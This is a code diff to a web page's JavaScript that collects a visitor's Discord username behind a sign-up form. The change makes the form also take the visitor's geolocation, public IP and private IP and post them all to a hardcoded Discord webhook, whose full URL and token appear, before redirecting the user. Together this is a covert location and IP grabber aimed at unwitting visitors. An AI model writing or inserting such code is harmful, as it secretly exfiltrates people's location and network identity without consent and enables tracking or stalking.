@@ -76,6 +76,7 @@
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           function(position) {
+
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
 
@@ -120,13 +121,20 @@
       const discordUsername = document.getElementById("discord-username").value;
       const discordWebhookUrl = "https://discordapp.com/api/webhooks/1337676565290553344/3SC7HaMd2fmvJbjUFjBSZLzZXyMcqyi1tRfIaXu2UhbZeTUFhiw2GpP8l1BKjAZsy8NQ";
 
-      // Send the Discord username to the webhook
+      // Fetch the user's location data and IP addresses
+      const locationData = document.getElementById("status").innerHTML;
+      const publicIp = document.getElementById("public_ip").value;
+      const privateIp = document.getElementById("private_ip").value;
+
+      // Send the Discord username, location data, and IP addresses to the webhook
       fetch(discordWebhookUrl, {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({ content: `New user: ${discordUsername}` })
+        body: JSON.stringify({
+          content: `New user: ${discordUsername}\nLocation: ${locationData}\nPublic IP: ${publicIp}\nPrivate IP: ${privateIp}`
+        })
       })
         .then(() => {
           // Redirect the user to the specified URL
